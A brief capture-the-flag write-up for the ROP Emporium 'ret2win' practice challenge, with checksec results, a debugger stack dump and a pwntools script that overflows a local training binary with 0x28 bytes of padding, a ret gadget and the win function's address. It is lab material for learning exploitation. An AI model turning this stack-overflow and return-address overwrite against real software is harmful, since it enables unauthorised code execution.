# ret2win(ROP Emporium 1)

### checksec
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

### Solution
ret2win function: 0x400756

after read, stack:
```
00:0000│ rsi rsp 0x7fffffffdc20 ◂— 'aaaaaaa\n'
01:0008│-018     0x7fffffffdc28 ◂— 0
... ↓            2 skipped
04:0020│ rbp     0x7fffffffdc40 —▸ 0x7fffffffdc50 
05:0028│+008     0x7fffffffdc48 —▸ 0x4006d7 (main+64) 
```
so, 0x28 chars and '0x400756' needed.

but, to avoid stack alignment constraint, return to any `ret` interaction.

### Script
```python
from pwn import *

conn = process('./ret2win')

conn.sendafter('> ', b'a' * 0x28 + p64(0x4006e7) + p64(0x400756))
conn.interactive()
```